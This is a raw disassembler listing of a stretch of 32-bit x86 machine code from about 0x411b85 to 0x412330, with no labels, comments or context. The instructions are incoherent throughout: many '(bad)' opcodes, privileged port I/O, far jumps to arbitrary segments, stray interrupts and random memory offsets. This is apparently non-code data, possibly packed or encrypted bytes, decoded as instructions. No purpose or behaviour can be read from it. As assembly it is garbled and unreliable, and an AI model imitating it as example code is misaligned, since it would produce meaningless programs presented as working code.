  411b85:	rcl    BYTE PTR [ebx],cl
  411b87:	sub    eax,0x8ddbb701
  411b8c:	into   
  411b8d:	into   
  411b8e:	into   
  411b8f:	and    eax,0xdad554f7
  411b94:	sbb    BYTE PTR [ebx],dl
  411b96:	leave  
  411b97:	ror    BYTE PTR fs:[edx],cl
  411b9a:	jmp    0xf5f5:0xf41e3c79
  411ba1:	xor    eax,0x8e456f95
  411ba6:	mov    dl,0x67
  411ba8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ba9:	jnp    0x411c1d
  411bab:	and    ah,al
  411bad:	out    dx,eax
  411bae:	shr    ch,cl
  411bb0:	jbe    0x411bd5
  411bb2:	sbb    al,0xe
  411bb4:	jecxz  0x411b82
  411bb6:	cdq    
  411bb7:	xor    edx,DWORD PTR [edi]
  411bb9:	push   cs
  411bba:	pop    ds
  411bbb:	ds jl  0x411bce
  411bbe:	lea    edi,[esi]
  411bc0:	add    al,al
  411bc2:	push   edx
  411bc3:	int    0xbc
  411bc5:	push   edx
  411bc6:	or     eax,0x4a3d1b2f
  411bcb:	adc    al,0x72
  411bcd:	cs aam 0x3c
  411bd0:	iret   
  411bd1:	test   esi,ecx
  411bd3:	xchg   edi,eax
  411bd4:	jne    0x411c36
  411bd6:	mov    bl,0xfd
  411bd8:	and    edi,DWORD PTR [edi]
  411bda:	or     eax,0x6d07002
  411bdf:	(bad)  
  411be0:	cmp    eax,0x9f2258f6
  411be5:	iret   
  411be6:	push   ebx
  411be8:	rcl    al,1
  411bea:	adc    BYTE PTR [eax-0x4e],ch
  411bed:	shl    ebp,1
  411bef:	push   0x3b31d931
  411bf4:	retf   
  411bf5:	inc    eax
  411bf6:	pop    esp
  411bf7:	xchg   edi,eax
  411bf8:	or     DWORD PTR [ecx-0x45],ebp
  411bfb:	jmp    0x411bf0
  411bfd:	div    BYTE PTR [ecx+0x31]
  411c00:	push   ecx
  411c01:	xchg   al,dl
  411c03:	sub    al,BYTE PTR [esi+0x60]
  411c06:	mov    bh,0x2d
  411c08:	cli    
  411c09:	in     eax,0xa2
  411c0b:	aad    0x42
  411c0d:	jae    0x411c1f
  411c0f:	repnz imul edx,DWORD PTR [ebx-0x67],0xfffffffa
  411c14:	test   BYTE PTR [edi],ch
  411c16:	xchg   esi,eax
  411c17:	adc    eax,0x84941341
  411c1c:	ret    
  411c1d:	loope  0x411bd5
  411c1f:	out    dx,eax
  411c20:	mov    al,0x95
  411c22:	mov    eax,esp
  411c24:	mov    DWORD PTR [eax-0x69e5fea4],eax
  411c2a:	dec    esp
  411c2b:	xlat   BYTE PTR ds:[ebx]
  411c2c:	jne    0x411c4a
  411c2e:	cmp    al,0x78
  411c30:	lock mov al,0xa6
  411c33:	imul   ecx,ecx,0xc8e229fa
  411c39:	dec    edi
  411c3a:	retf   
  411c3b:	rcr    eax,1
  411c3d:	mov    dl,0x63
  411c3f:	xor    ch,ch
  411c41:	sub    eax,0xb71542f6
  411c46:	(bad)  
  411c49:	jmp    0x411cc5
  411c4b:	pop    ebx
  411c4c:	mov    edx,edi
  411c4e:	and    DWORD PTR [eax+0x2e5c08cf],eax
  411c54:	xlat   BYTE PTR ds:[ebx]
  411c55:	das    
  411c56:	xchg   edx,eax
  411c57:	leave  
  411c58:	in     al,0x7b
  411c5a:	addr16 iret 
  411c5c:	sahf   
  411c5d:	inc    ebp
  411c5e:	pop    edi
  411c5f:	pop    edi
  411c60:	lahf   
  411c61:	data16 fidivr DWORD PTR gs:[ebp-0x4c]
  411c66:	jbe    0x411c4e
  411c68:	mov    bh,0xac
  411c6a:	pushf  
  411c6b:	or     al,0xed
  411c6d:	mov    ?,ebx
  411c6f:	arpl   WORD PTR [ebx],bp
  411c71:	cmc    
  411c72:	stos   DWORD PTR es:[edi],eax
  411c73:	xchg   edi,eax
  411c74:	jnp    0x411cd2
  411c76:	je     0x411caf
  411c78:	add    BYTE PTR [ecx+0x57],bh
  411c7b:	fs push ebp
  411c7d:	push   ebp
  411c7e:	lods   eax,DWORD PTR ds:[esi]
  411c7f:	icebp  
  411c80:	inc    ch
  411c82:	mov    edx,0x4a8aaaab
  411c87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c88:	or     bl,0x97
  411c8b:	das    
  411c8c:	aaa    
  411c8d:	popf   
  411c8e:	xlat   BYTE PTR ds:[ebx]
  411c8f:	fcmovnu st,st(3)
  411c91:	imul   ecx,ebp,0x54
  411c94:	aam    0xee
  411c96:	fld    st(4)
  411c98:	ja     0x411c5b
  411c9a:	sub    eax,0x543a6a12
  411c9f:	push   ebp
  411ca0:	aad    0x22
  411ca2:	xchg   ebp,eax
  411ca3:	test   eax,0x85e2a9a9
  411ca8:	or     edx,DWORD PTR [edi]
  411caa:	ds inc edx
  411cac:	sub    eax,0x36b5ce88
  411cb1:	pop    edi
  411cb2:	xchg   edi,eax
  411cb3:	or     DWORD PTR [esi+0x576eff9d],edi
  411cb9:	(bad)  
  411cba:	adc    dh,dl
  411cbc:	mov    ecx,0x498e2f6f
  411cc1:	popa   
  411cc2:	pusha  
  411cc3:	test   eax,0xf2d6d105
  411cc8:	jne    0x411cd2
  411cca:	loopne 0x411cff
  411ccc:	add    bh,0x1e
  411ccf:	jnp    0x411c7d
  411cd1:	in     al,0x72
  411cd3:	mov    ecx,0x7c7c7efe
  411cd8:	cld    
  411cd9:	jl     0x411cfd
  411cdb:	xchg   ecx,eax
  411cdc:	sar    dl,0xf5
  411cdf:	jmp    0x411c78
  411ce1:	clc    
  411ce2:	mov    bl,0x32
  411ce4:	mov    eax,ds:0xfe89f715
  411ce9:	push   0xffffffbb
  411ceb:	repz scas al,BYTE PTR es:[edi]
  411ced:	push   es
  411cee:	pop    edx
  411cef:	mov    ecx,0x16761c00
  411cf4:	mov    DWORD PTR [eax],edi
  411cf6:	add    BYTE PTR [edi-0x39df31d4],ah
  411cfc:	add    al,ah
  411cfe:	addr16 mov eax,ds:0x9ed1
  411d02:	push   0x5aad5abb
  411d07:	xor    edi,edi
  411d09:	mov    BYTE PTR [esi-0x7a],ch
  411d0c:	pop    ebp
  411d0d:	popf   
  411d0e:	xlat   BYTE PTR fs:[ebx]
  411d10:	push   es
  411d11:	add    BYTE PTR [edi+0x387083c7],cl
  411d17:	or     al,0xc3
  411d19:	xor    BYTE PTR [eax],dl
  411d1b:	mov    eax,ebp
  411d1d:	or     bh,bl
  411d1f:	imul   edi
  411d21:	(bad)  
  411d22:	fcomip st,st(5)
  411d24:	mov    eax,ds:0x13d681e7
  411d29:	mov    esi,0x6ad94288
  411d2e:	fisttp QWORD PTR [esi-0x5d]
  411d31:	mov    edi,DWORD PTR [ebp+0x3131f953]
  411d37:	aad    0x5d
  411d39:	ss push esi
  411d3b:	inc    ebp
  411d3c:	dec    ebx
  411d3d:	mov    eax,0xf07015da
  411d42:	jmp    0x8402fe28
  411d47:	mov    DWORD PTR [edi],eax
  411d49:	push   ds
  411d4a:	js     0x411d2c
  411d4c:	mov    bh,0xf1
  411d4e:	js     0x411d4c
  411d50:	aas    
  411d51:	sti    
  411d52:	jl     0x411d12
  411d54:	rcl    BYTE PTR [esi+0x19ac5b2d],1
  411d5a:	outs   dx,DWORD PTR ds:[esi]
  411d5b:	in     al,dx
  411d5c:	xor    al,0x23
  411d5e:	sar    al,1
  411d60:	pusha  
  411d61:	jns    0x411dbe
  411d63:	mov    edx,0xaf80fc5d
  411d68:	mov    edi,DWORD PTR [esi-0x20e71348]
  411d6e:	addr16 ficom WORD PTR [bp+di]
  411d72:	les    ecx,FWORD PTR [esi]
  411d74:	inc    ecx
  411d75:	in     eax,dx
  411d76:	(bad)  
  411d77:	jmp    0x6dabf316
  411d7c:	out    0x5c,al
  411d7e:	xor    DWORD PTR ds:0x9a367c58,esp
  411d84:	(bad)  
  411d85:	pop    esp
  411d86:	aam    0xde
  411d88:	je     0x411d27
  411d8a:	inc    edx
  411d8b:	mov    eax,ds:0x6cb97280
  411d90:	dec    ebp
  411d91:	sub    eax,0x35a69a67
  411d96:	sub    dl,BYTE PTR [eax-0x4f]
  411d99:	pop    eax
  411d9a:	ins    BYTE PTR es:[edi],dx
  411d9b:	sbb    cl,BYTE PTR [ebx-0x5120a080]
  411da1:	leave  
  411da2:	mov    dl,0xde
  411da4:	in     eax,0x17
  411da6:	popf   
  411da7:	popf   
  411da8:	popf   
  411da9:	xor    al,0xf3
  411dab:	push   esp
  411dac:	stc    
  411dad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411dae:	xchg   edi,eax
  411daf:	pop    esi
  411db0:	jp     0x411d98
  411db2:	fnsave [edi-0x21]
  411db5:	jge    0x411dba
  411db7:	xor    eax,0xe8265fdf
  411dbc:	pop    esp
  411dbd:	dec    eax
  411dbe:	inc    ebp
  411dbf:	mov    eax,ds:0x997c13b4
  411dc4:	fild   QWORD PTR [esi]
  411dc6:	adc    esi,edx
  411dc8:	push   esi
  411dc9:	in     al,0xc2
  411dcb:	add    eax,DWORD PTR [ecx+0x1898b3ad]
  411dd1:	sbb    al,0x2
  411dd3:	clc    
  411dd4:	mov    ecx,fs
  411dd6:	loopne 0x411d99
  411dd8:	or     DWORD PTR [ebx+0x56ef77bb],0x66
  411ddf:	data16 data16 imul BYTE PTR [eax]
  411de3:	mov    al,BYTE PTR [edx+0x5a371b8d]
  411de9:	xor    ecx,esi
  411deb:	mov    BYTE PTR [edx-0x10304bf6],al
  411df1:	pop    ss
  411df2:	test   DWORD PTR [ecx-0x42f66e32],ebx
  411df8:	in     al,dx
  411df9:	cmp    bh,ah
  411dfb:	pop    esi
  411dfc:	lods   eax,DWORD PTR ds:[esi]
  411dfd:	and    BYTE PTR [ebx],dl
  411dff:	and    bh,BYTE PTR [ebx-0x4d9d8b22]
  411e05:	push   cs
  411e06:	push   eax
  411e07:	dec    ebx
  411e08:	in     al,dx
  411e09:	xchg   ecx,eax
  411e0a:	adc    DWORD PTR [eax],eax
  411e0c:	inc    ecx
  411e0d:	push   ecx
  411e0e:	sbb    dl,BYTE PTR [ebx+0x73]
  411e11:	leave  
  411e12:	jmp    0x29a3:0x91a1d743
  411e19:	push   ebx
  411e1a:	mov    al,0x5a
  411e1c:	lods   eax,DWORD PTR ds:[esi]
  411e1d:	lea    ecx,ss:[ebx]
  411e20:	leave  
  411e21:	push   ebx
  411e22:	scas   al,BYTE PTR es:[edi]
  411e23:	pop    ebx
  411e24:	mov    ecx,0xc269a638
  411e29:	out    dx,eax
  411e2a:	mul    DWORD PTR [ebx-0x65ec4c4d]
  411e30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e31:	popa   
  411e32:	jp     0x411eae
  411e34:	fidivr DWORD PTR [ebp+ebp*8-0x4b]
  411e38:	xlat   BYTE PTR ds:[ebx]
  411e39:	sahf   
  411e3a:	jge    0x411e23
  411e3c:	popf   
  411e3d:	ja     0x411e9d
  411e3f:	inc    edi
  411e40:	lods   eax,DWORD PTR ds:[esi]
  411e41:	fstp   QWORD PTR [edi+0xd327082]
  411e47:	into   
  411e48:	int    0x77
  411e4a:	xchg   ecx,eax
  411e4b:	sbb    al,0xec
  411e4d:	add    bh,BYTE PTR [edx+0x32]
  411e50:	push   ebx
  411e51:	fmulp  st(6),st
  411e53:	mov    esp,0x2a87dd17
  411e58:	mov    ebx,0xdd828aef
  411e5d:	push   cs
  411e5e:	add    DWORD PTR [esi+eax*1+0x71],edi
  411e62:	call   0xf738c037
  411e67:	in     al,dx
  411e68:	fst    DWORD PTR [ebx]
  411e6a:	mov    al,bh
  411e6c:	jecxz  0x411ee5
  411e6e:	add    eax,eax
  411e70:	mov    dh,0x6d
  411e72:	fneni(8087 only) 
  411e74:	jbe    0x411e31
  411e76:	shl    edi,0xa
  411e79:	push   0xcaeda9a5
  411e7e:	mov    ah,0x23
  411e80:	push   es
  411e81:	sbb    ecx,eax
  411e83:	enter  0xd62,0xad
  411e87:	and    BYTE PTR [esi],ah
  411e89:	repz mov ah,0x5a
  411e8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e8d:	jmp    0x411e21
  411e8f:	mov    al,0xd9
  411e91:	mov    ch,0xe3
  411e93:	repz push esi
  411e95:	adc    DWORD PTR [edx-0x3],ecx
  411e98:	in     eax,0xd7
  411e9a:	adc    bh,cl
  411e9c:	sub    DWORD PTR [edi+0x5c94d6cb],edx
  411ea2:	aad    0x6a
  411ea4:	mov    ds:0x4def3f1f,eax
  411ea9:	sub    BYTE PTR [ebx-0x2e5920f1],ch
  411eaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411eb0:	shr    ecx,cl
  411eb2:	xor    al,0x12
  411eb4:	mov    DWORD PTR [esi+ecx*2],eax
  411eb7:	lahf   
  411eb8:	ds std 
  411eba:	jmp    0x1a22:0xf2bcaf2b
  411ec1:	jae    0x411ebd
  411ec3:	mov    ch,0x12
  411ec5:	pop    eax
  411ec6:	cmp    esi,DWORD PTR [ebx+0x7f]
  411ec9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411eca:	cmp    DWORD PTR ds:0x1271ebbb,0xc0899a00
  411ed4:	and    DWORD PTR [eax+0x1d0e03cf],eax
  411eda:	cmp    dh,BYTE PTR [eax+esi*8-0x7f]
  411ede:	pop    es
  411edf:	push   ds
  411ee0:	cmp    BYTE PTR [esi],dh
  411ee2:	aas    
  411ee3:	aas    
  411ee4:	mov    edi,0x5c489135
  411ee9:	xlat   BYTE PTR ds:[ebx]
  411eea:	rcl    ebx,cl
  411eec:	add    ecx,0xffffffc1
  411eef:	inc    ecx
  411ef0:	retf   
  411ef1:	aam    0x5
  411ef3:	xchg   esi,eax
  411ef4:	mov    edx,0xdbc27600
  411ef9:	mov    ?,WORD PTR [eax]
  411efb:	fs inc esp
  411efd:	and    bl,bl
  411eff:	xlat   BYTE PTR ds:[ebx]
  411f00:	push   cs
  411f01:	xor    ah,BYTE PTR [ecx-0x4e]
  411f04:	xor    edi,ebp
  411f06:	lds    esi,FWORD PTR [edx]
  411f08:	xor    al,0x10
  411f0a:	push   0x50278ab
  411f0f:	inc    esi
  411f10:	sub    DWORD PTR [ebx],esi
  411f12:	push   eax
  411f13:	jbe    0x411f94
  411f15:	xor    bl,ch
  411f17:	leave  
  411f18:	ins    DWORD PTR es:[edi],dx
  411f19:	mov    ds:0x349e5fb4,al
  411f1e:	inc    esp
  411f1f:	popf   
  411f20:	cmp    BYTE PTR [eax-0x60fa3ca5],0x9a
  411f27:	adc    DWORD PTR [ebx-0x4f],esp
  411f2a:	sbb    dl,ah
  411f2c:	icebp  
  411f2d:	clc    
  411f2e:	in     al,dx
  411f2f:	mov    eax,ds:0x7e9e8743
  411f34:	jecxz  0x411ec3
  411f36:	aaa    
  411f37:	inc    BYTE PTR [ebp-0x29]
  411f3a:	jne    0x411fad
  411f3c:	sub    al,0x9
  411f3e:	fldcw  WORD PTR [edi-0x55]
  411f41:	inc    ebp
  411f42:	xor    al,0xf7
  411f44:	lds    ebp,FWORD PTR [eax+0x4e52597d]
  411f4a:	sub    ax,0x2488
  411f4e:	jo     0x411f15
  411f50:	int    0xdc
  411f52:	push   cs
  411f53:	add    DWORD PTR [esi+eax*4-0xf],edi
  411f57:	(bad)  
  411f58:	pop    ebx
  411f59:	outs   dx,DWORD PTR ds:[esi]
  411f5a:	(bad)  
  411f5b:	out    dx,eax
  411f5c:	fidivr WORD PTR [ebp-0x6ad5af05]
  411f62:	cli    
  411f63:	(bad)  
  411f64:	jecxz  0x411f49
  411f66:	jecxz  0x411fa5
  411f68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f69:	imul   esp,DWORD PTR [edx-0x15],0x8708add6
  411f70:	ret    
  411f71:	(bad)  
  411f72:	dec    esp
  411f73:	cmp    ah,bl
  411f75:	pushf  
  411f76:	mov    bh,0x13
  411f78:	outs   dx,BYTE PTR ds:[esi]
  411f79:	fidiv  DWORD PTR [esi-0x1dba06cd]
  411f7f:	adc    bl,cl
  411f81:	mov    bh,al
  411f83:	or     BYTE PTR [edx],dh
  411f85:	ins    DWORD PTR es:[edi],dx
  411f86:	das    
  411f87:	or     dh,BYTE PTR [edi+0x475e2eb8]
  411f8d:	xor    al,0xd3
  411f8f:	gs xbegin 0x8097854b
  411f96:	in     al,dx
  411f97:	jle    0x411fdd
  411f99:	add    dl,BYTE PTR [esp+ebx*8-0x6e00843d]
  411fa0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411fa1:	shl    DWORD PTR [edi-0x9],0x75
  411fa5:	mov    ecx,0x2244885c
  411faa:	or     BYTE PTR [ebp+0x52a54842],al
  411fb0:	cwde   
  411fb1:	pushf  
  411fb2:	pushf  
  411fb3:	inc    esp
  411fb4:	and    dl,BYTE PTR [ecx-0x40a80708]
  411fba:	cli    
  411fbb:	aad    0x7f
  411fbd:	cli    
  411fbe:	loopne 0x411f43
  411fc0:	divps  xmm5,XMMWORD PTR [ebx-0x37f074f1]
  411fc7:	add    eax,0x8713ef99
  411fcc:	xchg   ebp,eax
  411fcd:	mov    bl,0x2b
  411fcf:	outs   dx,DWORD PTR ds:[esi]
  411fd0:	aaa    
  411fd1:	loopne 0x411f7f
  411fd3:	sub    al,0xb0
  411fd5:	(bad)  
  411fd6:	jg     0x412033
  411fd8:	or     ebp,edi
  411fda:	mov    cl,BYTE PTR [ecx-0x40]
  411fdd:	and    DWORD PTR [eax+0x7ade38cf],eax
  411fe3:	jmp    0x411f92
  411fe5:	int3   
  411fe6:	add    ecx,DWORD PTR [edi]
  411fe8:	cmp    al,0xb0
  411fea:	mov    edi,0xc60ead5a
  411fef:	bound  esi,QWORD PTR [ecx+0x2cd9b29b]
  411ff5:	push   es
  411ff6:	pop    es
  411ff7:	pop    es
  411ff8:	mov    cl,0x6e
  411ffa:	fnstsw WORD PTR [edx]
  411ffc:	stos   DWORD PTR es:[edi],eax
  411ffd:	and    ecx,DWORD PTR [edi+ebx*4]
  412000:	and    BYTE PTR [ebp-0x47],0xd6
  412004:	add    BYTE PTR [edi+0x3b],al
  412007:	mov    bh,0x80
  412009:	dec    DWORD PTR [edx+0x64c789e7]
  41200f:	stc    
  412010:	add    DWORD PTR [edx-0x1c12ce0],esp
  412016:	retf   
  412017:	out    0x16,eax
  412019:	adc    al,0xef
  41201b:	ror    ebx,0x52
  41201e:	mov    bl,0x1f
  412020:	in     eax,0xfd
  412022:	repz xor dh,BYTE PTR [edx]
  412025:	push   edx
  412026:	sub    BYTE PTR [ebp+0x33c4d64a],dl
  41202c:	in     al,0xe
  41202e:	sar    BYTE PTR ds:0x2861a7a8,1
  412034:	adc    al,0xb2
  412036:	data16 adc BYTE PTR [edx+0x4d22f178],bh
  41203d:	inc    edi
  41203e:	jg     0x41203e
  412040:	xchg   edi,eax
  412041:	mov    edi,0x2fb7e5fc
  412046:	pop    esi
  412047:	mov    esp,0x708011f8
  41204c:	std    
  41204d:	jb     0x412081
  41204f:	xor    edi,DWORD PTR [edi+0x39]
  412052:	es mov edi,0xa76f4f9d
  412058:	jmp    0xf847934a
  41205d:	add    edx,DWORD PTR [esi-0x7b]
  412060:	fild   QWORD PTR [ebx]
  412062:	ret    0x6bd5
  412065:	or     esi,DWORD PTR [edx+0x70]
  412068:	int    0xf1
  41206a:	in     al,dx
  41206b:	mov    bl,0xcf
  41206d:	(bad)  
  41206e:	lods   eax,DWORD PTR ds:[esi]
  41206f:	scas   al,BYTE PTR es:[edi]
  412070:	jmp    0x412071
  412072:	xor    eax,0xbcef0e1c
  412077:	jmp    0x79f1bc22
  41207c:	repz data16 je 0x4120f5
  412080:	jne    0x4120a3
  412082:	fwait
  412083:	int    0x5a
  412085:	xchg   ebx,eax
  412086:	fwait
  412087:	repnz mov ah,0x5a
  41208a:	push   ecx
  41208b:	clc    
  41208c:	in     eax,dx
  41208d:	push   es
  41208e:	stc    
  41208f:	loopne 0x41206c
  412091:	mov    ds:0x65684125,al
  412096:	add    eax,edx
  412098:	mov    edx,0x3e4e406c
  41209d:	aam    0x16
  41209f:	out    dx,eax
  4120a0:	add    BYTE PTR [esi+ecx*1],ah
  4120a3:	fldln2 
  4120a5:	cmc    
  4120a6:	jp     0x4120b9
  4120a8:	mov    DWORD PTR [esp+ebp*2-0x23],eax
  4120ac:	push   es
  4120ad:	mov    esi,0x212a54af
  4120b2:	cdq    
  4120b3:	dec    esp
  4120b4:	ss sbb eax,0xafc3ef13
  4120ba:	dec    ebp
  4120bb:	fld    QWORD PTR [edi-0x1bbc1307]
  4120c1:	jbe    0x4120c7
  4120c3:	add    al,BYTE PTR [ecx]
  4120c5:	call   0x3ab5af84
  4120ca:	(bad)  
  4120cb:	stc    
  4120cc:	stc    
  4120cd:	jns    0x41211b
  4120cf:	dec    edi
  4120d0:	dec    edi
  4120d1:	jge    0xc03faf65
  4120d7:	jecxz  0x4120a0
  4120d9:	(bad)  
  4120da:	dec    ebx
  4120dc:	clc    
  4120dd:	clc    
  4120de:	clc    
  4120df:	sub    al,0x1a
  4120e1:	mov    bl,0x4b
  4120e3:	sub    ebp,DWORD PTR [eax+0x4c]
  4120e6:	mov    eax,0xabb9a0a1
  4120eb:	mov    ebx,0x6df3f6ca
  4120f0:	mov    al,ds:0x3cc4c659
  4120f5:	add    BYTE PTR [ecx+0x14],bl
  4120f8:	pop    edi
  4120f9:	xchg   esi,eax
  4120fa:	das    
  4120fb:	and    bl,dh
  4120fd:	out    dx,eax
  4120fe:	in     eax,dx
  4120ff:	add    al,0x7f
  412101:	inc    ebp
  412102:	test   al,ah
  412104:	adc    al,al
  412106:	lahf   
  412107:	sbb    esi,esi
  412109:	in     eax,dx
  41210a:	fist   DWORD PTR [edi]
  41210c:	xor    al,0xc
  41210e:	jecxz  0x4120ff
  412110:	sub    edx,DWORD PTR [ebp-0x60c19c36]
  412116:	outs   dx,DWORD PTR ds:[esi]
  412117:	fst    st(6)
  412119:	lods   eax,DWORD PTR ds:[esi]
  41211a:	pop    ebx
  41211b:	jno    0x4120f8
  41211d:	ins    DWORD PTR es:[edi],dx
  41211e:	mov    bh,0x61
  412120:	int    0x9a
  412122:	xor    eax,0x988b1628
  412127:	lahf   
  412128:	lahf   
  412129:	xchg   DWORD PTR [esi+0x2bcf9669],esp
  41212f:	imul   esp,DWORD PTR ds:0xe6fca710,0x63
  412136:	or     eax,0x65e0b270
  41213b:	adc    BYTE PTR fs:0x3e481455,al
  412142:	(bad)  
  412144:	aas    
  412145:	mov    BYTE PTR [edi-0x23],0x1
  412149:	rcl    ah,1
  41214b:	fsub   QWORD PTR [esi]
  41214d:	and    eax,DWORD PTR [eax]
  41214f:	jle    0x41217f
  412151:	lods   eax,DWORD PTR ds:[esi]
  412152:	das    
  412153:	cs cs inc edx
  412156:	shl    DWORD PTR [ecx+ebp*1],cl
  412159:	fnop   
  41215b:	xor    eax,0xbf685d79
  412160:	xlat   BYTE PTR ds:[ebx]
  412161:	jmp    0x412118
  412163:	es lahf 
  412165:	aad    0x34
  412167:	or     eax,0x98a3a3a3
  41216c:	fwait
  41216d:	fwait
  41216e:	or     edi,0xffffffe7
  412171:	sub    ecx,DWORD PTR [edi-0xf437374]
  412177:	repnz retf 
  412179:	das    
  41217a:	aas    
  41217b:	xchg   ebx,eax
  41217c:	retf   
  41217d:	in     eax,0x8a
  41217f:	cmc    
  412180:	fist   DWORD PTR [ebx-0x1e]
  412183:	adc    edx,0x119166
  412189:	aas    
  41218a:	iret   
  41218b:	jp     0x4121a9
  41218d:	sub    al,0x15
  41218f:	outs   dx,BYTE PTR ds:[esi]
  412190:	mov    ebx,0xc72f3ea8
  412195:	iret   
  412196:	xchg   edi,eax
  412197:	(bad)  
  412198:	adc    eax,0xc2dbfb36
  41219d:	and    DWORD PTR [eax-0x703acc1],eax
  4121a3:	(bad)  
  4121a4:	aas    
  4121a5:	mov    esi,0xa7cd34ce
  4121aa:	jne    0x412209
  4121ac:	(bad)  
  4121ad:	cmp    ebx,DWORD PTR [edi-0x64b27831]
  4121b3:	ss loope 0x412154
  4121b6:	jnp    0x4121a6
  4121b8:	rcr    edx,0xb5
  4121bb:	imul   ebp,DWORD PTR [ebp-0x162c6b27],0xffffffb4
  4121c2:	in     eax,0xe7
  4121c4:	repnz sub eax,ebx
  4121c7:	les    esi,FWORD PTR [ecx]
  4121c9:	add    al,ch
  4121cb:	xor    DWORD PTR [ebx],eax
  4121cd:	fs dec ebp
  4121cf:	sub    BYTE PTR [ebp-0x31418234],0x97
  4121d6:	jbe    0x4121dc
  4121d8:	and    BYTE PTR [esi],bl
  4121da:	jmp    0x4121c6
  4121dc:	jmp    0xddc1:0xeec9f6b2
  4121e3:	add    DWORD PTR [edx-0x5f],0x60
  4121e7:	jne    0x4121ef
  4121e9:	mov    ds:0x27a13272,al
  4121ee:	jb     0x4121e1
  4121f0:	sti    
  4121f1:	std    
  4121f2:	xor    al,0x93
  4121f4:	xor    al,0x32
  4121f6:	cdq    
  4121f7:	or     al,0xa2
  4121f9:	shr    DWORD PTR [eax],1
  4121fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4121fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4121fe:	sub    DWORD PTR [edi],edi
  412200:	loopne 0x412239
  412202:	out    dx,eax
  412203:	mov    esp,0x7cffcef3
  412208:	jmp    0x4121b7
  41220a:	mov    bh,0xde
  41220c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41220d:	push   edi
  41220e:	and    BYTE PTR [ebp-0x753463e6],0xa8
  412215:	loope  0x41227c
  412217:	pop    edx
  412218:	pop    edi
  412219:	jbe    0x4121b9
  41221b:	push   ebp
  41221c:	pop    ebp
  41221d:	fsubr  DWORD PTR [ebx+0x7a]
  412220:	xchg   ebx,eax
  412221:	xchg   ebp,eax
  412222:	imul   esp,DWORD PTR [edi-0x1a],0xdff3227f
  412229:	scas   al,BYTE PTR es:[edi]
  41222a:	jb     0x41223a
  41222c:	dec    BYTE PTR [eax+esi*8+0x3ccf33cc]
  412233:	bound  ebx,QWORD PTR [edx-0x1a34081a]
  412239:	repnz in eax,dx
  41223b:	shl    DWORD PTR [eax-0x30],0xb7
  41223f:	gs retf 
  412241:	push   ss
  412242:	fdivr  QWORD PTR [edx-0x15]
  412245:	lods   eax,DWORD PTR ds:[esi]
  412246:	pop    eax
  412247:	mov    edi,0xb5543d7e
  41224c:	lea    edx,ss:[ebp+0x3a]
  412250:	popf   
  412251:	inc    esi
  412252:	ss fwait
  412254:	ins    DWORD PTR es:[edi],dx
  412255:	jmp    0x3c80:0xae294edf
  41225c:	pusha  
  41225d:	enter  0xc57f,0x75
  412261:	sbb    BYTE PTR [eax],0x74
  412264:	xchg   ebx,eax
  412265:	or     DWORD PTR [ebx-0x78983248],ebp
  41226b:	mov    ds:0xba8654e3,al
  412270:	inc    esp
  412271:	retf   
  412272:	enter  0x3441,0xed
  412276:	retf   
  412277:	in     eax,0x32
  412279:	xor    bl,BYTE PTR [ecx-0xf26ecb4]
  41227f:	fnstcw WORD PTR [ecx+eax*4+0x5a]
  412283:	push   es
  412284:	pop    edi
  412285:	sub    BYTE PTR [edx+esi*4],dl
  412288:	cli    
  412289:	push   esi
  41228a:	push   0x8989869a
  41228f:	or     DWORD PTR [esp+ecx*2+0x4c],ecx
  412293:	inc    eax
  412294:	xlat   BYTE PTR ds:[ebx]
  412295:	jne    0x4122da
  412297:	push   ebp
  412298:	aad    0x8b
  41229a:	pop    esi
  41229b:	scas   eax,DWORD PTR es:[edi]
  41229c:	test   DWORD PTR [edi],0xfe1fc3f
  4122a2:	cmpxchg bh,al
  4122a5:	mov    dl,0x93
  4122a7:	or     DWORD PTR [ecx-0x65],edx
  4122aa:	mov    eax,edx
  4122ac:	or     bh,BYTE PTR cs:[ebp+0x3b]
  4122b0:	add    dl,BYTE PTR [eax-0x65d90967]
  4122b6:	test   esi,edi
  4122b8:	call   0xcf80:0x21c13e09
  4122bf:	add    DWORD PTR [esi-0x4a960582],ebx
  4122c5:	pop    edx
  4122c6:	lods   eax,DWORD PTR ds:[esi]
  4122c7:	ficom  WORD PTR [ecx+ebp*4+0x54]
  4122cb:	out    dx,al
  4122cc:	push   edi
  4122cd:	push   ebp
  4122ce:	cmc    
  4122cf:	fstp   TBYTE PTR [edx-0x505e8052]
  4122d5:	scas   eax,DWORD PTR es:[edi]
  4122d6:	dec    edi
  4122d7:	sbb    eax,0x7541c1c
  4122dc:	push   es
  4122dd:	push   es
  4122de:	xchg   esp,eax
  4122df:	int    0x9b
  4122e1:	aaa    
  4122e2:	mov    ds:0x1acfafaf,eax
  4122e7:	push   ecx
  4122e8:	xchg   DWORD PTR [esi-0x3cfd192f],esp
  4122ee:	int    0x7e
  4122f0:	mov    ebx,0x1e406254
  4122f5:	fst    DWORD PTR [edi]
  4122f7:	test   ebx,edx
  4122f9:	outs   dx,BYTE PTR ds:[esi]
  4122fa:	fwait
  4122fb:	mov    ebx,0xe8023205
  412300:	call   0xfadbd3ed
  412305:	inc    esp
  412306:	ja     0x41234a
  412308:	mov    esp,0x581861a7
  41230d:	pop    esp
  41230e:	pop    esp
  41230f:	mov    ah,0x82
  412311:	xor    DWORD PTR [ecx+eiz*8],0x4c1e8d2c
  412318:	in     al,0x37
  41231a:	aaa    
  41231b:	aaa    
  41231c:	xchg   DWORD PTR [ecx+0x65cb1999],ebx
  412322:	shl    BYTE PTR [ebp-0x3],1
  412325:	arpl   WORD PTR [edi+0x5573f5cb],dx
  41232b:	push   ebp
  41232c:	dec    edi
  41232d:	add    ebx,DWORD PTR [eax]
  41232f:	cli    
  412330:	ror    DWORD PTR [edi-0x436c6b82],1
